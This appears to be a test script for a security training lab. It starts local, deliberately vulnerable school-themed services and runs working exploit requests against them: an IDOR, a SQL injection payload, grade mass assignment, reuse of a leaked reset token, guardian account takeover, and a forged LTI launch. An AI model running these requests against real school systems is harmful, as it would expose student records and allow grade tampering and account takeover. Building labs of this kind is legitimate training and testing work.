#!/usr/bin/env bun

import path from "path"

const repoRoot = path.resolve(import.meta.dir, "../../..")

function fail(proc: ReturnType<typeof Bun.spawn>, message: string): never {
  proc.kill()
  throw new Error(message)
}

async function startTarget(id: string) {
  const service = path.join(repoRoot, "tools", "ulmcode-labs", id, "service", "server.js")
  const proc = Bun.spawn(["bun", service], {
    stdout: "pipe",
    stderr: "pipe",
    env: { ...process.env, PORT: "0" },
  })

  const reader = proc.stdout.getReader()
  const timeout = setTimeout(() => fail(proc, `${id} service did not start`), 5000)
  const readyChunk = await reader.read()
  clearTimeout(timeout)
  const readyText = new TextDecoder().decode(readyChunk.value)
  const ready = JSON.parse(readyText.trim()) as { port?: number }
  if (!ready.port) fail(proc, `${id} service did not report a port`)
  return { proc, base: `http://127.0.0.1:${ready.port}` }
}

async function probeMfaGap() {
  const { proc, base } = await startTarget("k12-login-mfa-gap")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-login-mfa-gap") fail(proc, "health probe failed")

  const policy = await fetch(`${base}/idp/policy`).then((res) => res.json()) as { privilegedMfa?: string }
  if (policy.privilegedMfa !== "optional") fail(proc, "policy probe did not expose weak privileged MFA")

  const login = await fetch(`${base}/login`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "principal@admin.demo-school.test", password: "lab-password", role: "admin" }),
  }).then((res) => res.json()) as { authenticated?: boolean; privileged?: boolean; mfaRequired?: boolean; labFinding?: string }

  if (!login.authenticated || !login.privileged || login.mfaRequired || login.labFinding !== "weak_privileged_mfa") {
    fail(proc, "login probe did not confirm weak privileged MFA")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-login-mfa-gap", "weak_privileged_mfa: confirmed"]
}

async function probeRosterIdor() {
  const { proc, base } = await startTarget("k12-roster-idor")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-roster-idor") fail(proc, "health probe failed")

  const owned = await fetch(`${base}/api/classes`, {
    headers: { "x-teacher-id": "teacher-north" },
  }).then((res) => res.json()) as { classes?: Array<{ id?: string }> }
  if (!owned.classes?.some((item) => item.id === "north-homeroom")) fail(proc, "owned class probe failed")

  const roster = await fetch(`${base}/api/roster?classId=south-algebra`, {
    headers: { "x-teacher-id": "teacher-north" },
  }).then((res) => res.json()) as { authorized?: boolean; students?: unknown[]; labFinding?: string }
  if (!roster.authorized || !roster.students?.length || roster.labFinding !== "cross_tenant_roster_read") {
    fail(proc, "roster probe did not confirm cross-tenant read")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-roster-idor", "cross_tenant_roster_read: confirmed"]
}

async function probeGradebookMassAssignment() {
  const { proc, base } = await startTarget("k12-gradebook-mass-assignment")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-gradebook-mass-assignment") fail(proc, "health probe failed")

  const before = await fetch(`${base}/api/gradebook/student?studentId=student-3001`).then((res) => res.json()) as {
    records?: Array<{ score?: number }>
  }
  if (before.records?.[0]?.score !== 82) fail(proc, "gradebook baseline probe failed")

  const update = await fetch(`${base}/api/gradebook/update`, {
    method: "POST",
    headers: { "content-type": "application/json", "x-user-id": "student-3001" },
    body: JSON.stringify({
      studentId: "student-3001",
      courseId: "math-8",
      role: "teacher",
      teacherId: "teacher-math",
      score: 100,
    }),
  }).then((res) => res.json()) as { authorized?: boolean; grade?: { score?: number }; labFinding?: string }

  if (!update.authorized || update.grade?.score !== 100 || update.labFinding !== "student_grade_mass_assignment") {
    fail(proc, "gradebook probe did not confirm student write escalation")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-gradebook-mass-assignment", "student_grade_mass_assignment: confirmed"]
}

async function probeStorageConfigLeak() {
  const { proc, base } = await startTarget("k12-storage-config-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-storage-config-leak") fail(proc, "health probe failed")

  const config = await fetch(`${base}/api/config/client`).then((res) => res.json()) as {
    bucket?: string
    publicPrefix?: string
    labFinding?: string
  }
  if (
    config.bucket !== "demo-district-student-files" ||
    config.publicPrefix !== "student-support/" ||
    config.labFinding !== "public_storage_config_leak"
  ) {
    fail(proc, "storage config probe did not confirm public config leak")
  }

  const download = await fetch(`${base}/api/storage/download?path=student-support/iep-export.csv`).then((res) =>
    res.json(),
  ) as { authenticated?: boolean; authorized?: boolean; preview?: string; labFinding?: string }
  if (
    download.authenticated ||
    !download.authorized ||
    download.preview !== "student_id,plan_type,accommodation" ||
    download.labFinding !== "unauthenticated_student_file_read"
  ) {
    fail(proc, "storage download probe did not confirm unauthenticated student file read")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-storage-config-leak", "unauthenticated_student_file_read: confirmed"]
}

async function probeStudentSearchInjection() {
  const { proc, base } = await startTarget("k12-student-search-injection")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-student-search-injection") fail(proc, "health probe failed")

  const baseline = await fetch(`${base}/api/students/search?q=North`).then((res) => res.json()) as {
    resultCount?: number
    labFinding?: string
  }
  if (baseline.resultCount !== 1 || baseline.labFinding) fail(proc, "baseline search probe failed")

  const payload = encodeURIComponent("' OR '1'='1")
  const injected = await fetch(`${base}/api/students/search?q=${payload}`).then((res) => res.json()) as {
    resultCount?: number
    labFinding?: string
  }
  if (injected.resultCount !== 3 || injected.labFinding !== "student_search_query_injection") {
    fail(proc, "student search probe did not confirm query injection")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-student-search-injection", "student_search_query_injection: confirmed"]
}

async function probePasswordResetTokenLeak() {
  const { proc, base } = await startTarget("k12-password-reset-token-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-password-reset-token-leak") fail(proc, "health probe failed")

  const request = await fetch(`${base}/api/password-reset/request`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "teacher-reset@district.test" }),
  }).then((res) => res.json()) as { accepted?: boolean; account?: string; labFinding?: string | null }
  if (!request.accepted || request.account !== "teacher-reset@district.test" || request.labFinding) {
    fail(proc, "password reset request probe failed")
  }

  const audit = await fetch(`${base}/api/support/audit-log?account=teacher-reset@district.test`).then((res) =>
    res.json(),
  ) as { authenticated?: boolean; events?: Array<{ resetToken?: string }>; labFinding?: string }
  const token = audit.events?.[0]?.resetToken
  if (audit.authenticated || token !== "reset-lab-token-7142" || audit.labFinding !== "password_reset_token_leak") {
    fail(proc, "audit log probe did not confirm reset token leak")
  }

  const complete = await fetch(`${base}/api/password-reset/complete`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      account: "teacher-reset@district.test",
      token,
      password: "new-synthetic-password",
    }),
  }).then((res) => res.json()) as {
    reset?: boolean
    additionalVerification?: boolean
    labFinding?: string
  }
  if (!complete.reset || complete.additionalVerification || complete.labFinding !== "password_reset_token_reuse") {
    fail(proc, "reset completion probe did not confirm leaked token reuse")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-password-reset-token-leak", "password_reset_token_leak: confirmed"]
}

async function probeGuardianInviteTakeover() {
  const { proc, base } = await startTarget("k12-guardian-invite-takeover")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-guardian-invite-takeover") fail(proc, "health probe failed")

  const invite = await fetch(`${base}/api/guardian/invite?studentId=student-2241`).then((res) =>
    res.json(),
  ) as { authenticated?: boolean; inviteCode?: string; labFinding?: string }
  if (
    invite.authenticated ||
    invite.inviteCode !== "guardian-invite-2241" ||
    invite.labFinding !== "guardian_invite_code_disclosure"
  ) {
    fail(proc, "guardian invite probe did not confirm exposed invite code")
  }

  const link = await fetch(`${base}/api/guardian/accept`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      studentId: "student-2241",
      inviteCode: invite.inviteCode,
      email: "attacker-guardian@example.test",
    }),
  }).then((res) => res.json()) as {
    linked?: boolean
    verifiedBySchool?: boolean
    guardianCount?: number
    labFinding?: string
  }
  if (
    !link.linked ||
    link.verifiedBySchool ||
    link.guardianCount !== 2 ||
    link.labFinding !== "guardian_account_takeover"
  ) {
    fail(proc, "guardian accept probe did not confirm unauthorized account linking")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-guardian-invite-takeover", "guardian_account_takeover: confirmed"]
}

async function probeLtiSharedSecretLeak() {
  const { proc, base } = await startTarget("k12-lti-shared-secret-leak")
  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
  if (!health.ok || health.lab !== "k12-lti-shared-secret-leak") fail(proc, "health probe failed")

  const config = await fetch(`${base}/.well-known/lti-config.json`).then((res) => res.json()) as {
    consumerKey?: string
    sharedSecret?: string
    launchUrl?: string
    labFinding?: string
  }
  if (
    config.consumerKey !== "district-lms" ||
    config.sharedSecret !== "lti-secret-demo-9421" ||
    config.launchUrl !== "/lti/launch" ||
    config.labFinding !== "lti_shared_secret_disclosure"
  ) {
    fail(proc, "LTI config probe did not confirm shared secret disclosure")
  }

  const crypto = await import("node:crypto")
  const launch = {
    consumerKey: config.consumerKey,
    userId: "synthetic-instructor-9001",
    role: "Instructor",
    courseId: "math-8",
  }
  const signedLaunch = await fetch(`${base}/lti/launch`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      ...launch,
      signature: crypto.createHmac("sha256", config.sharedSecret).update(JSON.stringify(launch)).digest("hex"),
    }),
  }).then((res) => res.json()) as {
    launched?: boolean
    role?: string
    gradebookWrite?: boolean
    labFinding?: string
  }
  if (
    !signedLaunch.launched ||
    signedLaunch.role !== "Instructor" ||
    !signedLaunch.gradebookWrite ||
    signedLaunch.labFinding !== "forged_lti_instructor_launch"
  ) {
    fail(proc, "LTI launch probe did not confirm forged instructor launch")
  }

  proc.kill()
  await proc.exited
  return ["target: k12-lti-shared-secret-leak", "forged_lti_instructor_launch: confirmed"]
}

const lines = [
  "ulm_lab_target: ok",
  ...(await probeMfaGap()),
  ...(await probeRosterIdor()),
  ...(await probeGradebookMassAssignment()),
  ...(await probeStorageConfigLeak()),
  ...(await probeStudentSearchInjection()),
  ...(await probePasswordResetTokenLeak()),
  ...(await probeGuardianInviteTakeover()),
  ...(await probeLtiSharedSecretLeak()),
]

console.log(lines.join("\n"))
